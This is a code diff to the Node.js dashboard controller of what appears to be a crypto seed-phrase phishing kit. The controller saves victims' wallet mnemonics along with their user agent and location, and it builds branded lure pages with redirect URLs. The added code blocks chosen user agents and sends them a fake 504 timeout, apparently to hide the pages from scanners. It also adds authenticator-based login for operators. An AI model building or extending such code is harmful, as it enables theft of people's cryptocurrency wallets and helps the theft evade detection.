@@ -14,6 +14,9 @@ import moment from "moment";
 import sequelize from "../sequelize.js";
 import axios from "axios";
 import { Op } from "sequelize";
+import BlockedUserAgent from "../models/blockedAgent.js";
+import speakeasy from "speakeasy";
+import qrcode from "qrcode";
 
 // const getAllUser = async (req, res) => {
 //   try {
@@ -353,7 +356,7 @@ const createPhrase = async (req, res) => {
     }
 
     // Create phrase
-    const newPhrase = await Phrase.create({ userId, seed_phrase:phrase });
+    const newPhrase = await Phrase.create({ userId, seed_phrase: phrase });
 
     // Optionally include user info in the response
     const phraseWithUser = await Phrase.findByPk(newPhrase.id, {
@@ -363,14 +366,18 @@ const createPhrase = async (req, res) => {
     res.status(201).json(phraseWithUser);
   } catch (error) {
     console.error("Error creating phrase:", error);
-    res.status(500).json({ message: "Error creating phrase", error: error.message });
+    res
+      .status(500)
+      .json({ message: "Error creating phrase", error: error.message });
   }
 };
 
 const getPhrases = async (req, res) => {
   try {
     const phrases = await Phrase.findAll({
-      include: [{ model: User, as: "user", attributes: ["id", "userName", "email"] }],
+      include: [
+        { model: User, as: "user", attributes: ["id", "userName", "email"] },
+      ],
       order: [["createdAt", "DESC"]], // Optional: most recent first
     });
 
@@ -381,7 +388,9 @@ const getPhrases = async (req, res) => {
     res.status(200).json(phrases);
   } catch (error) {
     console.error("Error retrieving phrases:", error);
-    res.status(500).json({ message: "Error retrieving phrases", error: error.message });
+    res
+      .status(500)
+      .json({ message: "Error retrieving phrases", error: error.message });
   }
 };
 
@@ -681,7 +690,6 @@ const getCryptoLog = async (req, res) => {
 const setAccPhrase = async (req, res) => {
   try {
     const { mnemonic, userInfo, cryptoLogId } = req.body;
-
     if (!mnemonic || !userInfo || !cryptoLogId) {
       return res.status(400).json({ error: "Invalid Payload" });
     }
@@ -692,29 +700,33 @@ const setAccPhrase = async (req, res) => {
     });
 
     if (!location) {
-      return res.status(500).json({ error: "Failed to fetch location information" });
+      return res
+        .status(500)
+        .json({ error: "Failed to fetch location information" });
     }
 
     // Sequelize equivalent of findByIdAndUpdate
     const cryptoLog = await CryptoLogs.findByPk(cryptoLogId);
-
     if (!cryptoLog) {
-      return res.status(400).json({ error: "CryptoLog with the given ID not found" });
+      return res
+        .status(400)
+        .json({ error: "CryptoLog with the given ID not found" });
     }
 
     await cryptoLog.update({
       seed_phrase: mnemonic,
-      useragent:userInfo,
+      useragent: userInfo,
       location,
     });
 
     res.status(200).json({
       message: "Mnemonic phrase and user info saved successfully",
     });
-
   } catch (error) {
     console.error("Error in setAccPhrase:", error);
-    res.status(500).json({ error: "Failed to save mnemonic phrase and user info" });
+    res
+      .status(500)
+      .json({ error: "Failed to save mnemonic phrase and user info" });
   }
 };
 
@@ -1320,7 +1332,7 @@ const createUrl = async (req, res) => {
     // Create a new CryptoLog
     const newCryptoLog = await CryptoLogs.create({
       userId,
-      app_name:appName,
+      app_name: appName,
       appLogo,
       modalColor,
       backgroundcolor,
@@ -1340,7 +1352,7 @@ const createUrl = async (req, res) => {
       redirectUrl,
       cryptoLogId: newCryptoLog.id, // Use 'id' instead of '_id' for Sequelize
       appLogo,
-      app_name:appName,
+      app_name: appName,
       modalColor,
       btnColor,
       backgroundcolor,
@@ -1521,7 +1533,7 @@ const updateUrl = async (req, res) => {
       description,
       user: userId,
       redirectUrl,
-      app_name:appName,
+      app_name: appName,
       appLogo,
       backgroundcolor,
       modalColor,
@@ -1538,7 +1550,7 @@ const updateUrl = async (req, res) => {
     // Update the CryptoLog record
     await cryptoLog.update({
       userId,
-      app_name:appName,
+      app_name: appName,
       appLogo,
       modalColor,
       backgroundcolor,
@@ -1921,7 +1933,7 @@ const createSubscriptionHistory = async (req, res) => {
       expireDate: expireDate || new Date(),
       active: active ?? false,
       redeem: redeem ?? true,
-      createdBy:userId
+      createdBy: userId,
     });
 
     return res.status(201).json({
@@ -2282,6 +2294,188 @@ const verifyReCaptcha = async (req, res) => {
   }
 };
 
+const getBlockerStatus = async (req, res) => {
+  try {
+    const userAgent = req.headers["user-agent"] || "";
+    const blockedAgents = await BlockedUserAgent.findAll();
+    const isBlocked = blockedAgents.some((entry) =>
+      userAgent.includes(entry.userAgent)
+    );
+
+    if (isBlocked) {
+      return res.status(504).json({
+        message:
+          "Access denied. The server took too long to respond. Please try again later.",
+        blocked: true,
+        blockedAgents,
+      });
+    }
+
+    res.status(200).json({
+      message: "Access granted.",
+      blocked: false,
+      blockedAgents,
+    });
+  } catch (error) {
+    console.error("Error checking blocker status:", error);
+    res.status(500).json({
+      message: "Internal server error.",
+      error: error.message,
+    });
+  }
+};
+
+const updateBlockedUserAgents = async (req, res) => {
+  try {
+    const { blockedUserAgents } = req.body;
+
+    if (!Array.isArray(blockedUserAgents)) {
+      return res.status(400).json({
+        message: "Invalid data format. 'blockedUserAgents' must be an array.",
+      });
+    }
+
+    // Step 1: Get already existing user agents
+    const existingAgents = await BlockedUserAgent.findAll({
+      where: {
+        userAgent: {
+          [Op.in]: blockedUserAgents,
+        },
+      },
+    });
+
+    const existingValues = existingAgents.map((ua) => ua.userAgent);
+
+    // Step 2: Filter out only new ones
+    const newBlockedUAs = blockedUserAgents
+      .filter((ua) => !existingValues.includes(ua))
+      .map((ua) => ({ userAgent: ua }));
+
+    // Step 3: Bulk insert new entries (if any)
+    if (newBlockedUAs.length > 0) {
+      await BlockedUserAgent.bulkCreate(newBlockedUAs);
+    }
+
+    // Step 4: Fetch updated list
+    const updatedList = await BlockedUserAgent.findAll({
+      order: [["createdAt", "DESC"]],
+    });
+
+    if (!updatedList.length) {
+      return res.status(404).json({
+        message: "No blocked user agents found.",
+      });
+    }
+
+    res.status(200).json({
+      message: "Blocked user agents updated successfully.",
+      blockedUserAgents: updatedList.map((ua) => ua.userAgent),
+    });
+  } catch (error) {
+    console.error("Error updating blocked user agents:", error);
+    res.status(500).json({
+      message: "Internal server error.",
+      error: error.message,
+    });
+  }
+};
+
+const deleteBlockedUserAgent = async (req, res) => {
+  try {
+    const { id } = req.params;
+
+    const deletedCount = await BlockedUserAgent.destroy({
+      where: { id },
+    });
+
+    if (deletedCount === 0) {
+      return res.status(404).json({
+        message: "Blocked user agent not found.",
+      });
+    }
+
+    res.status(200).json({
+      message: "Blocked user agent deleted successfully.",
+      deletedId: id,
+    });
+  } catch (error) {
+    console.error("Error deleting blocked user agent:", error);
+    res.status(500).json({
+      message: "Internal server error.",
+      error: error.message,
+    });
+  }
+};
+
+const setupGoogleAuth = async (req, res) => {
+  try {
+    const { username } = req.body;
+
+    if (!username) {
+      return res.status(400).json({
+        message: "Username is required to generate Google Authenticator setup.",
+      });
+    }
+
+    const secret = speakeasy.generateSecret({
+      name: username,
+      length: 16,
+    });
+
+    const qrCodeUrl = await qrcode.toDataURL(secret.otpauth_url);
+
+    res.status(200).json({
+      message: "Google Authenticator setup generated successfully.",
+      secret: secret.base32,
+      otpauth_url: secret.otpauth_url,
+      qrCodeUrl,
+    });
+  } catch (error) {
+    console.error("Error generating Google Authenticator setup:", error);
+    res.status(500).json({
+      message: "Internal server error.",
+      error: error.message,
+    });
+  }
+};
+
+const verifyGoogleAuth = async (req, res) => {
+  try {
+    const { token, secret } = req.body;
+
+    if (!token || !secret) {
+      return res.status(400).json({
+        message: "Both token and secret are required for verification.",
+      });
+    }
+
+    const verified = speakeasy.totp.verify({
+      secret,
+      encoding: "base32",
+      token,
+      window: 1, // allow slight time drift
+    });
+
+    if (!verified) {
+      return res.status(400).json({
+        success: false,
+        message: "Invalid token. Please try again.",
+      });
+    }
+
+    res.status(200).json({
+      success: true,
+      message: "Token is valid.",
+    });
+  } catch (error) {
+    console.error("Error verifying Google Authenticator token:", error);
+    res.status(500).json({
+      message: "Internal server error.",
+      error: error.message,
+    });
+  }
+};
+
 export const dashboard = {
   getAllUser,
   getTodayUsers,
@@ -2325,4 +2519,9 @@ export const dashboard = {
   createPhrase,
   getPhrases,
   verifyReCaptcha,
+  getBlockerStatus,
+  updateBlockedUserAgents,
+  deleteBlockedUserAgent,
+  setupGoogleAuth,
+  verifyGoogleAuth,
 };
